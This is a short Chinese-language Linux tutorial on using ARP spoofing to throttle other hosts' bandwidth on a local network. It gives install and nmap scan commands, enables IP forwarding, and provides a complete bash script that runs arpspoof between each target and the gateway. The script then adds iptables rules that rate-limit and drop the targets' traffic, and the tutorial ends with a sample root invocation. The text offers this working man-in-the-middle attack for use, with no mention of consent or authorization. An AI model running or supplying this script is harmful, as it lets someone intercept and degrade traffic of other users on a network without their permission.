# linux下arp攻击之局域网限速
### 安装软件
```shell 
sudo apt-get install dsniff nmap
```
### 查看目标主机ip 
其中192.168.1.1为网关地址，如果你有其他方式可以获取目标主机ip ，可以不用这条命令
```
sudo nmap -ss 192.168.1.1/24
```
### 打开iptables转发开关

临时打开的方式：
```
sudo su
echo 1 >/proc/sys/net/ipv4/ip_forward
```

永久打开的方式：
```
编辑/etc/sysctl.conf文件，将net.ipv4.ip_forward=1前面的#注释去掉，保存文件，然后执行sudo sysctl -p使其生效
```

###创建shell脚本
```
#!/bin/bash
if [ $# -le 2 ]
then
    echo "Usage: ./iptables.sh speed gateway ip1 ip2 ...."
    exit -1
else
    speed=$1
    gateway=$2
fi
IPT=/sbin/iptables

while [ $# -gt 2 ]
do
    shift
    echo $gateway,$2
    arpspoof -i wlp3s0 -t $2 $gateway&
    arpspoof -i wlp3s0 -t $gateway $2&

    $IPT -A FORWARD -s $2  -m limit --limit ${speed}/s -j ACCEPT

    $IPT -A FORWARD -d $2  -m limit --limit ${speed}/s -j ACCEPT

    $IPT -A FORWARD -s $2  -j DROP

    $IPT -A FORWARD -d $2  -j DROP

done
```

###以ROOT权限运行之
```
sudo ./iptable.sh 10 192.168.1.1 192.168.1.100 192.168.1.101 
```
其中10为限制网速，192.168.1.1为网关地址，192.168.1.100为限速ip1,192.168.1.101为限速ip2 



